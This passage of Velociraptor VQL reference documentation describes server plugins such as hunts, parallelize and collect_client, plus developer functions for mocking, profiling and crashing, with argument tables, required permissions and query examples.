secret|Alternatively use a secret from the secrets service. Secret must be of type 'SMTP Creds'|string
headers|A dict of headers to send.|ordereddict.Dict

### Description

Send Email to a remote server.

See the mail() function for more details.



---END OF FILE---

======
FILE: /content/vql_reference/server/hunts/_index.md
======
---
title: hunts
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunts
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id|A hunt id to read, if not specified we list all of them.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the list of hunts.



---END OF FILE---

======
FILE: /content/vql_reference/server/backup_restore/_index.md
======
---
title: backup_restore
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## backup_restore
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The name of the backup file.|string (required)
prefix|Restore the backup from under this prefix in the zip file (defaults to org id).|string
providers|If provided only restore providers matching this regex.|string

### Description

Restore state from a backup file.


---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_flows/_index.md
======
---
title: hunt_flows
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_flows
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id|The hunt id to inspect.|string (required)
start_row|The first row to show (used for paging).|int64
limit|Number of rows to show (used for paging).|int64
basic_info|If specified we only return basic information like flow id and client id.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the flows launched by a hunt.

A Velociraptor hunt is just a collection of related flows. This
plugin simply enumerates all the flows as part of this hunt.

You can use this to figure out if all the collections were
successful by looking at the result of each flow object.



---END OF FILE---

======
FILE: /content/vql_reference/server/client_metadata/_index.md
======
---
title: client_metadata
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## client_metadata
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>
<span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Returns client metadata from the datastore.

Client metadata is a set of free form key/value data. Artifacts
may use this metdata or it may simply be used as part of your IR
processes.

### See also

- [client_set_metadata]({{< ref "/vql_reference/server/client_set_metadata/" >}}):
  Sets client metadata.



---END OF FILE---

======
FILE: /content/vql_reference/server/server_frontend_cert/_index.md
======
---
title: server_frontend_cert
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## server_frontend_cert
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Get Server Frontend Certificate


---END OF FILE---

======
FILE: /content/vql_reference/server/parallelize/_index.md
======
---
title: parallelize
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parallelize
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|The query will be run in parallel over batches.|StoredQuery (required)
client_id|The client id to extract|string
flow_id|A flow ID (client or server artifacts)|string
hunt_id|Retrieve sources from this hunt (combines all results from all clients)|string
artifact|The name of the artifact collection to fetch|string
source|An optional named source within the artifact|string
start_time|Start return events from this date (for event sources)|int64
end_time|Stop end events reach this time (event sources).|int64
notebook_id|The notebook to read from (should also include cell id)|string
notebook_cell_id|The notebook cell read from (should also include notebook id)|string
notebook_cell_table|A notebook cell can have multiple tables.)|int64
workers|Number of workers to spawn.)|int64
batch|Number of rows in each batch.)|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Runs query on result batches in parallel.

Normally the source() plugin reads result sets from disk in
series. This is fine when the result set is not too large but when
we need to filter a lot of rows at the same time it is better to
use all cores by reading and filtering in parallel.

The `parallelize()` plugin is a parallel version of `source()`
which breaks result sets into batches and applies a query over
each batch in parallel. If you have a multi threaded machine, it
will be a lot faster.

The query passed to parallelize() will receive a special scope in
which the `source()` plugin will returns results from a small
batch of the total. The size of this batch is controlled by the
`batch` parameter.

This is especially useful when we need to filter rows from a hunt
- each client's result set will be filtered in parallel on a
different core.

### Example

```vql
SELECT * FROM parallelize(hunt_id=HuntId, artifact=ArtifactName, query={
   SELECT * FROM source()
   WHERE FullPath =~ "XYZ"
})
```



---END OF FILE---

======
FILE: /content/vql_reference/server/user/_index.md
======
---
title: user
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## user
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to create or update.|string (required)
org|The org under which we query the user's ACL.|string

### Description

Retrieves information about the Velociraptor user.


---END OF FILE---

======
FILE: /content/vql_reference/server/get_client_monitoring/_index.md
======
---
title: get_client_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## get_client_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the current client monitoring state.

The client monitoring table represent's the server configuration
of client event queries to deploy.

This function is designed to allow programmatic manipulation of
the event query table in conjunction with set_client_monitoring()
function.

It is commonly used together with the `patch()` function to patch
the data structure to add additional event queries.



---END OF FILE---

======
FILE: /content/vql_reference/server/collect_client/_index.md
======
---
title: collect_client
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## collect_client
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to schedule a collection on|string (required)
artifacts|A list of artifacts to collect|list of string (required)
env|Parameters to apply to the artifact (an alternative to a full spec)|ordereddict.Dict
spec|Parameters to apply to the artifacts|ordereddict.Dict
timeout|Set query timeout (default 10 min)|uint64
ops_per_sec|Set query ops_per_sec value|float64
cpu_limit|Set query cpu_limit value|float64
iops_limit|Set query iops_limit value|float64
max_rows|Max number of rows to fetch|uint64
max_bytes|Max number of bytes to upload|uint64
urgent|Set the collection as urgent - skips other queues collections on the client.|bool
org_id|If set the collection will be started in the specified org.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>
<span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>
<span class="permission_list linkcolour label label-important">COLLECT_BASIC</span>

### Description

Launch an artifact collection against a client. If the client_id
is "server" then the collection occurs on the server itself. In
that case the caller needs the SERVER_ADMIN permission.

There are two way of specifying how to collect the artifacts. The
simplest way is to specify the environment string using the `env`
parameter, and a list of artifacts to collect in the `artifacts`
parameter.

In this case all artifacts will receive the the same
parameters. For example:

```vql
SELECT collect_client(
    client_id='C.11a3013ccaXXXXX',
    artifacts='Windows.KapeFiles.Targets',
    env=dict(Device ='C:', VSSAnalysis='Y', KapeTriage='Y')).request AS Flow
FROM scope()
```

Sometimes we have a number of artifacts that use the same
parameter name for different purposes. In that case we wish to
specify precisely which artifact receives which parameter. This
more complex way of specifying the collection using the `spec`
parameter:

```vql
SELECT collect_client(
    client_id='C.11a3013ccaXXXXX',
    artifacts='Windows.KapeFiles.Targets',
    spec=dict(`Windows.KapeFiles.Targets`=dict(
        Device ='C:', VSSAnalysis='Y', KapeTriage='Y'))).request AS Flow
FROM scope()
```

In this case the artifact names are repeated in the spec and the
artifacts parameter.

### Example - conditional collections

In this example we wish to create an artifact with check buttons
for selecting groups of artifacts to launch. Assume `Do1` and
`Do2` are boolean parameters:

1. Depending on the checkbox condition we set a set of dicts and
   potential arguments.

2. Next we rely on the fact that dict additions merge the keys of
   each dict to create a merged dict. The `Spec` dict is
   constructed by joining the different parts together

3. To obtain the list of unique artifacts we use the `items()`
   plugin to extract the keys from the spec dict.

```vql
LET X1 = if(condition=Do1, then=dict(`Generic.Client.Info`=dict()), else=dict())
LET X2 = if(condition=Do2, then=dict(`Generic.System.Pstree`=dict()), else=dict())

LET Spec = X1 + X2

LET ArtifactNames = SELECT _key FROM items(item=Spec)

SELECT collect_client(
         spec=Spec,
         artifacts=ArtifactNames._key,
         client_id='C.49982ba4c2ccef20') AS collection
FROM scope()
```

### Notes

When constructing the dictionaries for the spec parameter
you will often need to specify a field name containing full
stop. You can escape this using the backticks like the example above.



---END OF FILE---

======
FILE: /content/vql_reference/developer/_index.md
======
---
title: Developer
weight: 85
linktitle: Developer
index: true
no_edit: true
no_children: true
---

These functions and plugins are only used during development, for automated
testing, and occasionally for troubleshooting.

Normally you would not use these!
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[mock](mock)|<span class='vql_type'>Function</span>|Mock a plugin|
|[mock_check](mock_check)|<span class='vql_type'>Function</span>|Check expectations on a mock|
|[mock_clear](mock_clear)|<span class='vql_type'>Function</span>|Resets all mocks|
|[mock_replay](mock_replay)|<span class='vql_type'>Function</span>|Replay recorded calls on a mock|
|[panic](panic)|<span class='vql_type'>Plugin</span>|Crash the program with a panic!|
|[profile](profile)|<span class='vql_type'>Plugin</span>|Returns a profile dump from the running process|
|[profile_goroutines](profile_goroutines)|<span class='vql_type'>Plugin</span>|Enumerates all running goroutines|
|[profile_memory](profile_memory)|<span class='vql_type'>Plugin</span>|Enumerates all in use memory within the runtime|
|[trace](trace)|<span class='vql_type'>Function</span>|Upload a trace file|

---END OF FILE---

======
FILE: /content/vql_reference/developer/panic/_index.md
======
---
title: panic
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## panic
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Crash the program with a panic!


---END OF FILE---

======
FILE: /content/vql_reference/developer/mock_replay/_index.md
======
---
title: mock_replay
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mock_replay
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
plugin|The plugin to mock|string
function|The function to mock|string
expected_calls|How many times plugin should be called|int
clear|This call will clear previous mocks for this plugin|bool

### Description

Replay recorded calls on a mock.


---END OF FILE---

======
FILE: /content/vql_reference/developer/trace/_index.md
======
---
title: trace
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## trace
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Upload a trace file.


---END OF FILE---

======
FILE: /content/vql_reference/developer/profile_goroutines/_index.md
======
---
title: profile_goroutines
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## profile_goroutines
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
verbose|Emit information in verbose form.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerates all running goroutines.


---END OF FILE---

======
FILE: /content/vql_reference/developer/profile/_index.md
======
---
title: profile
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## profile
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
allocs|A sampling of all past memory allocations|bool
block|Stack traces that led to blocking on synchronization primitives|bool
goroutine|Stack traces of all current goroutines|bool
heap|A sampling of memory allocations of live objects.|bool
mutex|Stack traces of holders of contended mutexes|bool
profile|CPU profile.|bool
trace|CPU trace.|bool
debug|Debug level|int64
logs|Recent logs|bool
queries|Recent Queries run|bool
metrics|Collect metrics|bool
duration|Duration of samples (default 30 sec)|int64
type|The type of profile (this is a regex of debug output types that will be shown).|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Returns a profile dump from the running process.


---END OF FILE---

======
FILE: /content/vql_reference/developer/mock/_index.md
======
---
title: mock
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mock
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
plugin|The plugin to mock|string
function|The function to mock|string
artifact|The artifact to mock|Any
results|The result to return|LazyExpr (required)

### Description

Mock a plugin.


---END OF FILE---

======
FILE: /content/vql_reference/developer/profile_memory/_index.md
======
---
title: profile_memory
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## profile_memory
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerates all in use memory within the runtime.


---END OF FILE---

======
FILE: /content/vql_reference/developer/mock_check/_index.md
======
---
title: mock_check
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mock_check
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
plugin|The plugin to mock|string
function|The function to mock|string
expected_calls|How many times plugin should be called|int
clear|This call will clear previous mocks for this plugin|bool

### Description

Check expectations on a mock.


---END OF FILE---

======
FILE: /content/vql_reference/developer/mock_clear/_index.md
======
---
title: mock_clear
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mock_clear
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Resets all mocks.


---END OF FILE---

